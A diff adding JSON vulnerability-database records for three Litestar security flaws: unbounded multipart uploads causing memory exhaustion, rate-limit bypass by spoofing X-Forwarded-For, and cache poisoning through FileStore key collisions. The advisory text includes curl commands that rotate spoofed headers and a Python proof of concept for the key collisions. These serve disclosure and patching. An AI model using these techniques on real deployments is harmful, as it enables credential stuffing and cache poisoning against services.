+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52581"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/53c1473b5ff7502816a9a339ffc90731bb0c2138"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/blob/main/litestar/_multipart.py#L97"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/litestar/PYSEC-2024-178.yaml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-gjcc-jvgw-wvwj",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0a0",
+        "2.0.0",
+        "2.0.0a3",
+        "2.0.0a4",
+        "2.0.0a5",
+        "2.0.0a6",
+        "2.0.0a7",
+        "2.0.0b1",
+        "2.0.0b2",
+        "2.0.0b3",
+        "2.0.0b4",
+        "2.0.0rc1",
+        "2.0.1",
+        "2.1.0",
+        "2.1.1",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.4.4",
+        "2.4.5",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.5.4",
+        "2.5.5",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.6.3",
+        "2.6.4",
+        "2.7.0",
+        "2.7.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1"
+      ],
+      "affected_conda_versions": [
+        "2.8.0",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1"
+      ]
+    },
+    {
+      "id": "GHSA-hm36-ffrh-c77c",
+      "primary_id": "CVE-2025-59152",
+      "aliases": [
+        "CVE-2025-59152"
+      ],
+      "cve_ids": [
+        "CVE-2025-59152"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar X-Forwarded-For Header Spoofing Vulnerability Enables Rate Limit Evasion",
+      "details": "While testing Litestar's RateLimitMiddleware, I discovered that rate limits can be completely bypassed by manipulating the X-Forwarded-For header. This renders IP-based rate limiting ineffective against determined attackers.\n\n## The Problem\n\nLitestar's RateLimitMiddleware uses `cache_key_from_request()` to generate cache keys for rate limiting. When an X-Forwarded-For header is present, the middleware trusts it unconditionally and uses its value as part of the client identifier.\n\nSince clients can set arbitrary X-Forwarded-For values, each different spoofed IP creates a separate rate limit bucket. An attacker can rotate through different header values to avoid hitting any single bucket's limit.\n\nLooking at the relevant code in `litestar/middleware/rate_limit.py` around [line 127](https://github.com/litestar-org/litestar/blob/26f20ac6c52de2b4bf81161f7560c8bb4af6f382/litestar/middleware/rate_limit.py#L127), there's no validation of proxy headers or configuration for trusted proxies.\n\n## Reproduction Steps\n\nHere's a minimal test case\n\n```python\nfrom litestar import Litestar, get\nfrom litestar.middleware.rate_limit import RateLimitConfig\nimport uvicorn\n\n@get(\"/api/data\")\ndef get_data() -> dict:\n    return {\"message\": \"sensitive data\"}\n\nrate_config = RateLimitConfig(rate_limit=(\"minute\", 2))\n\napp = Litestar(\n    route_handlers=[get_data],\n    middleware=[rate_config.middleware]\n)\n\nif __name__ == \"__main__\":\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n```\n\nTesting the bypass\n\n```bash\n# Normal requests get rate limited after 2 requests\ncurl http://localhost:8000/api/data  # 200 OK\ncurl http://localhost:8000/api/data  # 200 OK  \ncurl http://localhost:8000/api/data  # 429 Too Many Requests\n\n# But spoofing X-Forwarded-For bypasses the limit entirely\ncurl -H \"X-Forwarded-For: 192.168.1.100\" http://localhost:8000/api/data  # 200 OK\ncurl -H \"X-Forwarded-For: 192.168.1.101\" http://localhost:8000/api/data  # 200 OK\ncurl -H \"X-Forwarded-For: 192.168.1.102\" http://localhost:8000/api/data  # 200 OK\n```\n\n## Security Impact\n\nThis vulnerability has several concerning implications:\n\nBrute Force Protection Bypass: Authentication endpoints protected by rate limiting become vulnerable to credential stuffing attacks. An attacker can attempt thousands of login combinations from a single source.\n\nAPI Abuse: Public APIs relying on rate limiting for abuse prevention can be scraped or hammered without restriction.\n\nResource Exhaustion: While not a traditional DoS, the ability to bypass rate limits means attackers can consume more server resources than intended.\n\nThe issue is particularly problematic because many developers deploy Litestar applications directly (not behind a proxy) during development or in containerized environments, making this attack vector accessible.\n\n## Potential Solutions\n\nAfter reviewing how other frameworks handle this:\n\n- Default to socket IP only: Don't trust proxy headers unless explicitly configured\n- Trusted proxy configuration: Add settings to specify which proxy IPs are allowed to set forwarded headers\n- Header validation: Implement basic validation of forwarded IP formats\n\nDjango handles this through `SECURE_PROXY_SSL_HEADER` and trusted proxy lists. Express.js has similar trusted proxy configurations.\n\nFor immediate mitigation, applications can deploy behind a properly configured reverse proxy that strips/overwrites client-controllable headers before they reach Litestar.\n\n## Environment Details\n\n- Litestar version: 2.17.0\n- Python: 3.11\n\nThis affects any Litestar application using RateLimitMiddleware with default settings, which likely includes most applications that implement rate limiting.",
+      "published": "2025-10-06T20:18:00Z",
+      "modified": "2025-10-13T15:13:31Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-hm36-ffrh-c77c"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59152"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/42a89e043e50b515f8548a93954fe143f63cf9fb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/blob/26f20ac6c52de2b4bf81161f7560c8bb4af6f382/litestar/middleware/rate_limit.py#L127"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-hm36-ffrh-c77c",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.17.0"
+            },
+            {
+              "fixed": "2.18.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.17.0"
+      ],
+      "affected_conda_versions": [
+        "2.17.0"
+      ]
+    },
+    {
+      "id": "GHSA-vxqx-rh46-q2pg",
+      "primary_id": "CVE-2026-25480",
+      "aliases": [
+        "CVE-2026-25480"
+      ],
+      "cve_ids": [
+        "CVE-2026-25480"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": "Litestar's FileStore key canonicalization collisions allow response cache mixup/poisoning (ASCII ord + Unicode NFKD)",
+      "details": "### Summary\nFileStore maps cache keys to filenames using Unicode NFKD normalization and ord() substitution without separators, creating key collisions. When FileStore is used as response-cache backend, an unauthenticated remote attacker can trigger cache key collisions via crafted paths, causing one URL to serve cached responses of another (cache poisoning/mixup)\n\n### Details\nlitestar.stores.file._safe_file_name() normalizes input with unicodedata.normalize(\"NFKD\", name) and builds the filename by concatenating c if alphanumeric else str(ord(c)) (no delimiter).\nThis transformation is not injective, e.g.:\n\n- \"k-\" and \"k45\" both become \"k45\" (because - ord('-') == 45)\n- \"k/\\n\" becomes \"k4710\", colliding with \"k4710\"\n- \"\u212a\" (Kelvin sign) normalizes to \"K\", colliding with \"K\"\n\nWhen used in response caching, the default cache key includes request path and sorted query params, which are attacker-controlled.\n\n### PoC\n\n```\nimport asyncio, tempfile\nfrom litestar.stores.file import FileStore\n\nasync def main():\n    d = tempfile.mkdtemp(prefix=\"ls_filestore_poc_\")\n    store = FileStore(d, create_directories=True)\n    await store.__aenter__()\n\n    # 1) ASCII ord-collision: \"-\" -> 45\n    await store.set(\"k-\", b\"A\")\n    v = await store.get(\"k45\")\n    print(\"k-  ->\", v)\n    print(\"k45 ->\", await store.get(\"k45\"))\n    if v == b\"A\":\n        print(\"VULNERABLE: 'k-' collides with 'k45'\")\n\n    # 2) NFKD collision: Kelvin sign -> K\n    await store.set(\"\u212a\", b\"B\")   # U+212A\n    v2 = await store.get(\"K\")\n    print(\"\u212a ->\", await store.get(\"\u212a\"))\n    print(\"K ->\", v2)\n    if v2 == b\"B\":\n        print(\"VULNERABLE: '\u212a' collides with 'K' (NFKD)\")\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\n### Impact\nVulnerability type: cache poisoning / cache key collision.\nImpacted deployments: applications using Litestar response caching with FileStore backend (or any attacker-influenced keying into FileStore).\nPossible impact: serving incorrect cached content across distinct URLs, potential confidentiality/integrity issues depending on what endpoints are cached.",
+      "published": "2026-02-09T17:19:06Z",
+      "modified": "2026-02-22T23:25:49.404374Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-vxqx-rh46-q2pg"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25480"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/commit/85db6183a76f8a6b3fd6ee3c88d860b9f37a2cca"
+        },
+        {
+          "type": "WEB",
+          "url": "https://docs.litestar.dev/2/release-notes/changelog.html#2.20.0"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/litestar-org/litestar"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/releases/tag/v2.20.0"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-vxqx-rh46-q2pg",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.19.0"
+            },
+            {
+              "fixed": "2.20.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "2.19.0"
+      ],
+      "affected_conda_versions": [
+        "2.19.0"
+      ]
+    },
+    {
+      "id": "PYSEC-2024-178",
+      "primary_id": "CVE-2024-52581",
+      "aliases": [
+        "CVE-2024-52581",
+        "GHSA-gjcc-jvgw-wvwj"
+      ],
+      "cve_ids": [
+        "CVE-2024-52581"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "litestar",
+      "summary": null,
+      "details": "Litestar is an Asynchronous Server Gateway Interface (ASGI) framework. Prior to version 2.13.0, the multipart form parser shipped with litestar expects the entire request body as a single byte string and there is no default limit for the total size of the request body. This allows an attacker to upload arbitrary large files wrapped in a `multipart/form-data` request and cause excessive memory consumption on the server. The multipart form parser in affected versions is vulnerable to this type of attack by design. The public method signature as well as its implementation both expect the entire request body to be available as a single byte string. It is not possible to accept large file uploads in a safe way using this parser. This may be a regression, as a variation of this issue was already reported in CVE-2023-25578. Limiting the part number is not sufficient to prevent out-of-memory errors on the server. A patch is available in version 2.13.0.",
+      "published": "2024-11-20T21:15:08Z",
+      "modified": "2026-02-04T07:36:14.209515Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-gjcc-jvgw-wvwj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-p24m-863f-fm6q"
+        },
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/litestar-org/litestar/security/advisories/GHSA-gjcc-jvgw-wvwj"
+        },
+        {
+          "type": "FIX",
+          "url": "https://github.com/litestar-org/litestar/commit/53c1473b5ff7502816a9a339ffc90731bb0c2138"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/litestar-org/litestar/blob/main/litestar/_multipart.py#L97"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/PYSEC-2024-178",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.13.0"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.0a0",
+        "2.0.0",
+        "2.0.0a3",
+        "2.0.0a4",
+        "2.0.0a5",
+        "2.0.0a6",
+        "2.0.0a7",
+        "2.0.0b1",
+        "2.0.0b2",
+        "2.0.0b3",
+        "2.0.0b4",
+        "2.0.0rc1",
+        "2.0.1",
+        "2.1.0",
+        "2.1.1",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.4.4",
+        "2.4.5",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.5.4",
+        "2.5.5",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.6.3",
+        "2.6.4",
+        "2.7.0",
+        "2.7.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1"
+      ],
+      "affected_conda_versions": [
+        "2.8.0",
+        "2.8.2",
+        "2.8.3",
+        "2.9.0",
+        "2.9.1",
+        "2.10.0",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1"
+      ]
+    }
+  ]
+}
